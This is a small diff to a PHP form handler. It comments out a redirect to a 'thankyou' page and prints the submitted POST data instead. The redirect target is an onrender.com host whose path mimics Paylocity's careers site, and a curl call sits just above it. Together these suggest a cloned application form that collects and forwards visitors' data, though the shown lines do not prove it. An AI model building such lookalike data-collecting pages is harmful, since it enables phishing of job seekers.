@@ -130,8 +130,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             curl_close($ch);
         }
     }
-
-header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/thankyou.html");
-exit;
+    print_r($_POST);
+// header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/thankyou.html");
+// exit;
 }
 ?>
